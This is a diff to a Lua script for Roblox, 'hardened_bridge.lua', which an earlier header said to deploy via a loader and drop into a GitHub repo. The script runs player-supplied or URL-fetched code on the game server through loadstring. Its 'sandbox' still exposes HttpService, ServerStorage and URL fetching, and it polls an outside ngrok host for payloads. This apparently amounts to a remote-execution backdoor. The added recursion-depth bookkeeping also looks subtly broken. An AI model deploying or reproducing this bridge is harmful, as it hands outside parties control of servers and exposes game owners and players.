@@ -1,6 +1,5 @@
 -- ============================================================
--- hardened_bridge.lua - Deploy via loader.lua
--- Drop into GitHub repo as bridge.lua
+-- hardened_bridge.lua - Debugged & Loader-Compatible
 -- ============================================================
 
 -- CONFIGURATION
@@ -34,14 +33,12 @@ if isServer then
     ServerScriptService   = game:GetService("ServerScriptService")
 else
     warn("[Bridge] Not running in server context - some features limited")
-    -- Fallback: use what's available
     Players           = game:GetService("Players")
     HttpService       = game:GetService("HttpService")
     ReplicatedStorage = game:GetService("ReplicatedStorage")
     Workspace         = game:GetService("Workspace")
     Lighting          = game:GetService("Lighting")
     RunService        = game:GetService("RunService")
-    -- Crypto may not be available client-side
     local ok, cs = pcall(function() return game:GetService("CryptoService") end)
     CryptoService = ok and cs or nil
 end
@@ -78,8 +75,17 @@ local function getService(name)
     return nil
 end
 
+-- Recursion depth tracker
+local depth = 0
+
 -- Sandbox environment
 local function buildSandbox(source)
+    depth = depth + 1
+    if depth > MAX_DEPTH then
+        depth = depth - 1
+        error("[Sandbox] Max recursion depth exceeded")
+    end
+
     local sandboxEnv = {
         print = function(...)
             local args = {...}
@@ -140,109 +146,130 @@ local function buildSandbox(source)
         },
         utf8 = utf8,
         _VERSION = _VERSION,
-        -- Controlled game proxy
-        game = setmetatable({}, {
-            __index = function(_, key)
-                if key == "Players" then return Players end
-                if key == "Workspace" then return Workspace end
-                if key == "Lighting" then return Lighting end
-                if key == "ReplicatedStorage" then return ReplicatedStorage end
-                if key == "ServerStorage" then return ServerStorage end
-                if key == "ServerScriptService" then return ServerScriptService end
-                if key == "HttpService" then return HttpService end
-                if key == "RunService" then return RunService end
-                if key == "CollectionService" then return CollectionService end
-                if key == "Teams" then return Teams end
-                if key == "Chat" then return Chat end
-                if key == "GetService" then return getService end
-                if key == "GetObjects" then
-                    return function(url)
-                        return HttpService and {pcall(function()
-                            return HttpService:HttpGet(url)
-                        end)} or {}
-                    end
-                end
-                warn("[Sandbox] Blocked access to game." .. tostring(key))
-                return nil
-            end,
-            __newindex = function()
-                error("[Sandbox] Cannot modify game")
-            end
-        }),
-        -- Controlled require
-        require = function(id)
-            if type(id) ~= "number" then
-                error("[Sandbox] require() only accepts numeric IDs")
-            end
-            local allowed = { [0] = true }
-            if not allowed[id] then
-                error("[Sandbox] require(" .. id .. ") not in allowlist")
-            end
-            local ok, mod = pcall(function()
-                return if isServer then
-                    require(ServerScriptService:FindFirstChild(tostring(id)))
-                else
-                    require(id)
-                end
-            end)
-            if ok then return mod end
-            error("[Sandbox] Module " .. id .. " not found: " .. tostring(mod))
-        end,
-        -- Controlled loadstring
-        loadstring = function(src)
-            if type(src) ~= "string" then
-                error("[Sandbox] loadstring expects a string")
-            end
-            if #src > MAX_PAYLOAD then
-                error("[Sandbox] Payload exceeds " .. MAX_PAYLOAD .. " bytes")
-            end
-            local fn, err = loadstring(src)
-            if fn then
-                setfenv(fn, buildSandbox(src))
-            end
-            return fn, err
-        end,
-        -- Task library
-        task = {
-            spawn = task.spawn, delay = task.delay, wait = task.wait,
-            defer = task.defer, cancel = task.cancel
-        },
-        -- Debug (restricted)
-        debug = {
-            traceback = debug.traceback,
-        },
-        -- Instance (create limited types)
-        Instance = {
-            new = function(className)
-                local allowed = {
-                    Part = true, BillboardGui = true, ScreenGui = true,
-                    Frame = true, TextLabel = true, TextButton = true,
-                    TextBox = true, ScrollingFrame = true, ImageLabel = true,
-                    UICorner = true, UIStroke = true, UIGradient = true,
-                    Folder = true, Model = true, Tool = true,
-                    RemoteEvent = true, RemoteFunction = true,
-                    IntValue = true, StringValue = true, ObjectValue = true,
-                    BoolValue = true, NumberValue = true
-                }
-                if not allowed[className] then
-                    error("[Sandbox] Cannot create " .. className)
-                end
-                return Instance.new(className)
-            end
-        },
-        -- Color3
-        Color3 = {
-            new = Color3.new, fromRGB = Color3.fromRGB,
-            fromHSV = Color3.fromHSV
-        },
-        -- UDim2
-        UDim2 = {
-            new = UDim2.new, fromScale = UDim2.fromScale,
-            fromOffset = UDim2.fromOffset
-        },
     }
+
+    -- Controlled game proxy
+    sandboxEnv.game = setmetatable({}, {
+        __index = function(_, key)
+            if key == "Players" then return Players end
+            if key == "Workspace" then return Workspace end
+            if key == "Lighting" then return Lighting end
+            if key == "ReplicatedStorage" then return ReplicatedStorage end
+            if key == "ServerStorage" then return ServerStorage end
+            if key == "ServerScriptService" then return ServerScriptService end
+            if key == "HttpService" then return HttpService end
+            if key == "RunService" then return RunService end
+            if key == "CollectionService" then return CollectionService end
+            if key == "Teams" then return Teams end
+            if key == "Chat" then return Chat end
+            if key == "GetService" then return getService end
+            if key == "GetObjects" then
+                return function(url)
+                    local ok, res = pcall(function()
+                        return HttpService:HttpGet(url)
+                    end)
+                    if ok then return {res} end
+                    return {}
+                end
+            end
+            warn("[Sandbox] Blocked access to game." .. tostring(key))
+            return nil
+        end,
+        __newindex = function()
+            error("[Sandbox] Cannot modify game")
+        end
+    })
+
+    -- Controlled require
+    sandboxEnv.require = function(id)
+        if type(id) ~= "number" then
+            error("[Sandbox] require() only accepts numeric IDs")
+        end
+        local allowed = { [0] = true }
+        if not allowed[id] then
+            error("[Sandbox] require(" .. id .. ") not in allowlist")
+        end
+        local ok, mod
+        if isServer then
+            local modObj = ServerScriptService:FindFirstChild(tostring(id))
+            if modObj then
+                ok, mod = pcall(function() return require(modObj) end)
+            else
+                error("[Sandbox] Module " .. id .. " not found in ServerScriptService")
+            end
+        else
+            ok, mod = pcall(function() return require(id) end)
+        end
+        if ok then
+            depth = depth - 1
+            return mod
+        end
+        error("[Sandbox] Module " .. id .. " error: " .. tostring(mod))
+    end
+
+    -- Controlled loadstring
+    sandboxEnv.loadstring = function(src)
+        if type(src) ~= "string" then
+            error("[Sandbox] loadstring expects a string")
+        end
+        if #src > MAX_PAYLOAD then
+            error("[Sandbox] Payload exceeds " .. MAX_PAYLOAD .. " bytes")
+        end
+        local fn, err = loadstring(src)
+        if fn then
+            setfenv(fn, buildSandbox(src))
+        end
+        depth = depth - 1
+        return fn, err
+    end
+
+    -- Task library
+    sandboxEnv.task = {
+        spawn = task.spawn, delay = task.delay, wait = task.wait,
+        defer = task.defer, cancel = task.cancel
+    }
+
+    -- Debug (restricted)
+    sandboxEnv.debug = {
+        traceback = debug.traceback
+    }
+
+    -- Instance (create limited types)
+    sandboxEnv.Instance = {
+        new = function(className)
+            local allowed = {
+                Part = true, BillboardGui = true, ScreenGui = true,
+                Frame = true, TextLabel = true, TextButton = true,
+                TextBox = true, ScrollingFrame = true, ImageLabel = true,
+                UICorner = true, UIStroke = true, UIGradient = true,
+                Folder = true, Model = true, Tool = true,
+                RemoteEvent = true, RemoteFunction = true,
+                IntValue = true, StringValue = true, ObjectValue = true,
+                BoolValue = true, NumberValue = true
+            }
+            if not allowed[className] then
+                error("[Sandbox] Cannot create " .. className)
+            end
+            return Instance.new(className)
+        end
+    }
+
+    -- Color3
+    sandboxEnv.Color3 = {
+        new = Color3.new, fromRGB = Color3.fromRGB,
+        fromHSV = Color3.fromHSV
+    }
+
+    -- UDim2
+    sandboxEnv.UDim2 = {
+        new = UDim2.new, fromScale = UDim2.fromScale,
+        fromOffset = UDim2.fromOffset
+    }
+
     sandboxEnv._G = sandboxEnv
     sandboxEnv._ENV = sandboxEnv
+
+    depth = depth - 1
     return sandboxEnv
 end
 
@@ -271,6 +298,7 @@ local function executeCode(player, code)
         warn("[Bridge] Rate limit hit for", player.Name)
         return
     end
+    depth = 0
     local fn, err = loadstring(code)
     if not fn then
         warn("[Bridge] Syntax error:", err)
@@ -299,7 +327,6 @@ Remote.OnServerEvent:Connect(function(player, action, payload)
             warn("[Bridge] Payload too large")
             return
         end
-        -- URL-based: fetch first
         if payload:match("^https?://") then
             local ok, code = pcall(function()
                 return game:HttpGet(payload)
@@ -313,15 +340,19 @@ Remote.OnServerEvent:Connect(function(player, action, payload)
     elseif action == "REQUIRE" then
         local id = tonumber(payload)
         if id then
-            local ok, mod = pcall(function()
-                if isServer then
-                    return require(ServerScriptService:FindFirstChild(tostring(id)))
-                else
-                    return require(id)
+            local ok, mod
+            if isServer then
+                local modObj = ServerScriptService:FindFirstChild(tostring(id))
+                if modObj then
+                    ok, mod = pcall(function() return require(modObj) end)
                 end
-            end)
+            else
+                ok, mod = pcall(function() return require(id) end)
+            end
             if ok then
                 print("[Bridge] Resolved require(" .. id .. ")")
+            else
+                warn("[Bridge] Failed require(" .. id .. "):", mod)
             end
         end
     end
@@ -336,7 +367,7 @@ if API_SECRET ~= "" then
                     Url = "https://subventionary-letha-boughten.ngrok-free.dev",
                     Method = "GET",
                     Headers = {
-                        ["X-Timestamp"] = tostring(os.time()),
+                        ["X-Timestamp"] = tostring(os.time())
                     }
                 })
                 return response
@@ -344,7 +375,6 @@ if API_SECRET ~= "" then
             if ok and result and result.StatusCode == 200 then
                 local body = result.Body
                 if body and body ~= "" then
-                    -- Verify HMAC
                     local receivedSig = result.Headers["x-signature"]
                     if receivedSig and CryptoService then
                         local ts = result.Headers["x-timestamp"] or ""
